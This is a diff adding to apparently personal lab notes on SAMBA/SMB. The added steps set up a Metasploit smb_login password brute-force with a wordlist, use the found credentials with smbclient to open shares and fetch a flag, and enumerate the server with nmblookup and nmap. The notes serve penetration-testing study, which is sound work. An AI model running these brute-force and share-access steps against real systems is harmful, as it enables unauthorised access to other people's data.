@@ -183,3 +183,34 @@ SAMBA is the Linux implementation of SMB, and allows Windows systems to access L
 - `search smb_login`
 - `use auxiliary/scanner/smb/smb_login`
 - `options`
+- `set SMBUser admin` set username to brutforce
+- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` ser password file
+- `set STOP_ON_SUCCESS true` The brutforce will stop if we succeeded
+We actually found one:
+
+![image](https://github.com/user-attachments/assets/dc95fe80-2308-4e6e-a483-c76c6ee0bc61)
+
+**Connect with the SMBClient**
+- `smbclient -L \\\\192.217.223.3\\ -U admin` List the available shares with the user admin
+- then it asks you for the password(you can give in the correct password from before)
+
+![image](https://github.com/user-attachments/assets/c2db7922-cac4-4e33-8e4e-2dba66cd2e82)
+
+- `smbclient \\\\192.217.223.3\\public -U admin` Access the share of the user public with the user admin
+When your in the smb console it should look like this:y<
+
+![image](https://github.com/user-attachments/assets/fc568a9c-2b9b-4a28-a448-c005701fd8be)
+
+- `cd secret` to find the flag in the secret folder
+- `ls`
+- `get flag`
+- `exit`
+- `cat flag`
+
+**Find NetBIOS computername of the samba server:**
+- `nmblookup -A 192.217.223.3` With nmblookup
+- `nmap --script smb-os-discovery.nse -p 445 192.217.223.3` With NMAP
+
+![image](https://github.com/user-attachments/assets/d563c97d-97ba-4282-a2a5-d8ece667b519)
+
+
